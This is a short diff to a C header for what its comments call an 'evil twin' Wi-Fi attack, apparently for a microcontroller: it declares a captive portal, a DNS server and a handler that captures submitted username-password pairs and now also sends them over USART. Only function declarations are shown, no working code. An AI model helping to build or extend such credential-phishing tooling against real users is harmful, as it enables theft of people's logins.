@@ -1,10 +1,8 @@
 #ifndef WEB_HANDLER_H
 #define WEB_HANDLER_H
 
-#include <WiFi.h>
-#include <WebServer.h>
-
-extern WebServer http_server; 
+extern WebServer http_server;
+extern DNSServer dns_server; 
 
 // this function setup all the routes for the evil twin. //
 void setup_web_handler();
@@ -19,10 +17,7 @@ void captive_portal();
 void main_handler();
 
 // this function activates everytime user submit a username-passwrd pair. //
-// the credentials are written on the serial output. //
+// the credentials are written on the serial output and sent on usart. //
 void submit_handler();
-
-// this function shuts the evil twin down. //
-void shutdown_handler();
 
 #endif
